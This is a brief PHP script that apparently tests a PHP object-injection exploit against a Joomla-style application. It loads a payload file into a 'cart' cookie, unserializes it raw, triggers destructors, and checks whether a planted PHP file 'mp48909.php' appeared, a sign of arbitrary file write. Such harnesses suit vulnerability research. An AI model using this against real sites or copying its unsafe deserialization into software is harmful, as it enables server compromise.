<?php
require __DIR__.'/boot_common.php';
$payload = trim(file_get_contents(__DIR__.'/payload.txt'));
$_COOKIE['cart'] = $payload;
$app=mp_boot();
$input=$app->getInput();
$raw=$input->cookie->get('cart',null,'raw');
echo "cookie_len=".strlen((string)$raw)."\n";
$obj=@unserialize($raw);
echo "type=".(is_object($obj)?get_class($obj):gettype($obj))."\n";
unset($obj); gc_collect_cycles();
echo "exists=".(file_exists(JPATH_BASE.'/mp48909.php')?'YES':'NO')."\n";
